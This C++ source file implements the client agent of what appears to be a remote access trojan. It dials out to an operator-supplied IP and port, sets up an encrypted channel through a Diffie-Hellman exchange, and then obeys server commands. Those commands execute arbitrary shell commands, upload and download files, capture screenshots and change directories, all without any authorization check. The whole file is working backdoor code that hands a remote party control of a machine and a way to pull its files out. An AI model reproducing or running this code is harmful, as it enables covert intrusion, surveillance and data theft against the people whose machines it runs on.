#include "Agent.h"

M_Result Agent::Connect(PCSTR ip, PCSTR port)
{
	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connSocket.Create() != M_Success)
	{
		return M_GenericError;
	}

	if (connSocket.Connect(ip, port) != M_Success)
	{
		connSocket.Close();
		return M_GenericWarning;
	}

	serverConn = Connection(connSocket.GetSocketHandle(), ip, port);
	
	if (OnConnect(serverConn) != M_Success)
	{
		return M_GenericError;
	}

	return M_Success;
}

M_Result Agent::OnConnect(Connection& connection)
{
	Packet packet;

	BCRYPT_ALG_HANDLE exchDH = NULL;
	BCRYPT_KEY_HANDLE keyPair = NULL;
	BCryptBufferDesc ParameterList = { 0 };
	BCryptBuffer BufferArray[2] = { 0 };
	std::vector<BYTE> pubBlob;
	std::vector<BYTE> clientHello(32);
	std::vector<BYTE> serverHello(32);
	std::vector<BYTE> seed(64);
	LPCWSTR Label = L"master secret";

	// generate client hello bytes
	auto optClientHello = EasyBCrypt::GenerateRandomBytes(32);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optClientHello))
	{
		std::string err = std::move(*(*out));
		std::cerr << err << std::endl;
		return M_GenericError;
	}

	clientHello = std::get<std::vector<BYTE>>(optClientHello);

	// send the clientHello
	packet << clientHello;
	if (connection.SendPacket(packet) != M_Success)
	{
		return M_GenericError;
	}

	// receive serverHello
	if (connection.RecvPacket(packet) != M_Success)
	{
		return M_GenericError;
	}

	try
	{
		packet >> serverHello;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return M_GenericError;
	}
	
	seed.assign(clientHello.begin(), clientHello.end());
	seed.insert(seed.end(), serverHello.begin(), serverHello.end());
	
	// KDF parameters
	//specify secret to append
	BufferArray[0].BufferType = KDF_TLS_PRF_SEED;
	BufferArray[0].cbBuffer = seed.size();
	BufferArray[0].pvBuffer = (PVOID)&seed[0];

	//specify secret to prepend
	BufferArray[1].BufferType = KDF_TLS_PRF_LABEL;
	BufferArray[1].cbBuffer = (DWORD)((wcslen(Label) + 1) * sizeof(WCHAR));
	BufferArray[1].pvBuffer = (PVOID)Label;

	ParameterList.cBuffers = 2;
	ParameterList.pBuffers = BufferArray;
	ParameterList.ulVersion = BCRYPTBUFFER_VERSION;

	// create Diffie Hellman parameter blob
	std::shared_ptr<BYTE[]> paramBlob = EasyBCrypt::CreateDHParamBlob();

	// Generate keypair
	auto optClientPubBlob = EasyBCrypt::GenerateDHKeyPair(paramBlob, exchDH, keyPair);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optClientPubBlob))
	{
		std::string err = *(*out);
		std::cout << err << std::endl;
		return M_GenericError;
	}

	// send client pubBlob to server
	pubBlob = std::get<std::vector<BYTE>>(optClientPubBlob);
	packet.Clear();
	packet << pubBlob;

	if (connection.SendPacket(packet) != M_Success)
	{
		return M_GenericError;
	}

	// receive the server pubBlob
	if (connection.RecvPacket(packet) != M_Success)
	{
		return M_GenericError;
	}

	try
	{
		packet >> pubBlob;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return M_GenericError;
	}

	// Generate secret agreement
	auto optSecret = EasyBCrypt::GenerateDHSecret(exchDH, keyPair, pubBlob, BCRYPT_KDF_TLS_PRF, &ParameterList);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optSecret))
	{
		std::string err = *(*out);
		std::cout << err << std::endl;
		return M_GenericError;
	}

	packet.Clear();

	// 48 bytes shared secret
	std::vector<BYTE> sharedSecret = std::get<std::vector<BYTE>>(optSecret);

	// initialize a cipher object
	std::vector<BYTE> key(sharedSecret.begin(), sharedSecret.begin() + 16);

	packet << command.GetCurrentDir();

	try
	{
		serverConn.Crypt = Crypter(key);
		serverConn.Crypt.EncryptPacket(packet);
	}

	catch (const CrypterException& e)
	{
		std::cout << e.what() << std::endl;
		return M_GenericError;
	}

	if (connection.SendPacket(packet) != M_Success)
	{
		return M_GenericError;
	}

	return M_Success;
}

void Agent::ShutDown()
{
	connSocket.Close();
}

M_Result Agent::Logic()
{
	Packet packet;
	CommandType type;
	M_Result result {};

	result = serverConn.RecvPacket(packet);
	if (result != M_Success)
	{
		return result;
	}

	try
	{
		serverConn.Crypt.DecryptPacket(packet);
		type = static_cast<CommandType>(packet.GetPacketType());

		if (type == CommandType::agentdown)
		{
			return M_GenericError;
		}

		else if (type == CommandType::upload)
		{
			std::string path;
			uint32_t bytesToRead;
			packet >> path >> bytesToRead;

			// check if the specified remotepath exist
			std::filesystem::path _path(path);
			if (std::filesystem::exists(_path.parent_path()) and std::filesystem::is_directory(_path.parent_path()))
			{
				// send valid packet and continue receving the content
				packet.Clear(PacketType::response);
				serverConn.Crypt.EncryptPacket(packet);

				result = serverConn.SendPacket(packet);
				if (result != M_Success)
				{
					return result;
				}

				result = serverConn.RecvFile(path, bytesToRead);
				if (result != M_Success)
				{
					return result;
				}
			}

			else
			{
				// send invalid packet and return
				packet.Clear(PacketType::Invalid);
				serverConn.Crypt.EncryptPacket(packet);

				result = serverConn.SendPacket(packet);
				if (result != M_Success)
				{
					return result;
				}
			}	
		}

		else if (type == CommandType::download)
		{
			std::string path;
			packet >> path;

			if (std::filesystem::exists(path))
			{
				uintmax_t filesize = std::filesystem::file_size(path);

				packet.Clear(PacketType::response);
				packet << filesize;

				serverConn.Crypt.EncryptPacket(packet);

				result = serverConn.SendPacket(packet);
				if (result != M_Success)
				{
					return result;
				}

				result = serverConn.SendFile(path, filesize);
				if (result != M_Success)
				{
					return result;
				}
			}

			else
			{
				packet.Clear(PacketType::Invalid);
				serverConn.Crypt.EncryptPacket(packet);

				result = serverConn.SendPacket(packet);
				if (result != M_Success)
				{
					return result;
				}
			}
		}

		else if (type == CommandType::screenshot)
		{
			std::vector<BYTE> imageBytes;

			command.TakeScreenshot(imageBytes);
			packet << imageBytes;

			serverConn.Crypt.EncryptPacket(packet);

			result = serverConn.SendPacket(packet);
			if (result != M_Success)
			{
				return result;
			}
		}

		else
		{
			if (type == CommandType::changedir)
			{
				std::string newCurrentDir;
				packet >> newCurrentDir;

				if (command.SetCurrentDir(newCurrentDir))
				{
					packet.Clear(PacketType::response);
					packet << " " + command.GetCurrentDir() + "\n";
				}

				else
				{
					packet.Clear(PacketType::Invalid);
					packet << ">> [!] The system cannot find the path specified.\n";
				}
			}

			else
			{
				std::string cmd;
				packet >> cmd;

				if (not command.Execute(cmd))
				{
					return M_GenericWarning;
				}

				packet.Clear(PacketType::response);
				packet << command.GetOutput();
			}

			serverConn.Crypt.EncryptPacket(packet);
			result = serverConn.SendPacket(packet);
			if (result != M_Success)
			{
				return result;
			}
		}
	}

	catch (const CrypterException& e)
	{
		std::cout << e.what() << std::endl;
		return M_GenericError;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return M_GenericError;
	}

	return M_Success;
}
